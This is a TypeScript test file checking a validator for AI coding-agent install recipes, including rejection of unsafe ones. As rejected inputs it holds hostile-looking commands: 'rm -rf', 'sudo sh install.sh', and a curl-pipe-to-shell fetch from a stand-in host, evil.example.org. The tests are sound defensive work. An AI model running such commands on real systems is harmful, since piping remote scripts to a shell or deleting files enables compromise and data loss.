import { describe, it, expect } from 'vitest'
import { readdirSync } from 'fs'
import { join } from 'path'
import { parseAgentRecipe, RECIPE_FILES, BUILTIN_RECIPES, recipeHash } from './agentRecipes'
import { PROVIDER_IDS } from './providers'

describe('agent recipes (2.3 A1)', () => {
  it('bundles every recipe file in src/shared/agents', () => {
    const onDisk = readdirSync(join(__dirname, 'agents')).filter((f) => f.endsWith('.json')).sort()
    expect(Object.keys(RECIPE_FILES).sort()).toEqual(onDisk)
  })
  it('loads every bundled recipe', () => {
    for (const [f, raw] of Object.entries(RECIPE_FILES)) {
      const r = parseAgentRecipe(raw)
      expect(r.ok, `${f}: ${r.ok ? '' : r.reason}`).toBe(true)
    }
  })
  it('has a recipe for every built-in agent, Claude recommended', () => {
    for (const id of PROVIDER_IDS) expect(BUILTIN_RECIPES[id].id).toBe(id)
    expect(BUILTIN_RECIPES['claude-code'].recommended).toBe(true)
    expect(BUILTIN_RECIPES.codex.prereq).toBeUndefined()   // standalone installer, no Node needed
  })
  it('fingerprints the install command so a change asks again', () => {
    const r = BUILTIN_RECIPES['claude-code']
    expect(recipeHash(r)).toBe(recipeHash({ ...r }))
    expect(recipeHash({ ...r, install: { ...r.install!, cmd: r.install!.cmd + ' -s beta' } })).not.toBe(recipeHash(r))
  })
  const base = { id: 'x', label: 'X', detect: ['x'], docs: 'https://example.com' }
  it('rejects bad recipes with a reason', () => {
    expect(parseAgentRecipe(null)).toMatchObject({ ok: false })
    expect(parseAgentRecipe({ ...base, id: 'Bad Id' })).toMatchObject({ ok: false })
    expect(parseAgentRecipe({ ...base, detect: [] })).toMatchObject({ ok: false })
    expect(parseAgentRecipe({ ...base, detect: ['rm -rf'] })).toMatchObject({ ok: false })
    expect(parseAgentRecipe({ ...base, docs: 'http://insecure' })).toMatchObject({ ok: false })
    expect(parseAgentRecipe({ id: 'x', label: 'X', detect: ['x'] })).toMatchObject({ ok: false, reason: expect.stringMatching(/install command or a docs link/) })
  })
  it('refuses sudo and installers that download from another host', () => {
    expect(parseAgentRecipe({ ...base, install: { cmd: 'sudo sh install.sh', host: 'example.com' } })).toMatchObject({ ok: false })
    const r = parseAgentRecipe({ ...base, install: { cmd: 'curl -fsSL https://evil.example.org/i.sh | sh', host: 'example.com' } })
    expect(r).toMatchObject({ ok: false, reason: expect.stringMatching(/other than example.com/) })
    expect(parseAgentRecipe({ ...base, install: { cmd: 'curl -fsSL https://example.com/i.sh | sh', host: 'example.com' } })).toMatchObject({ ok: true })
  })
})
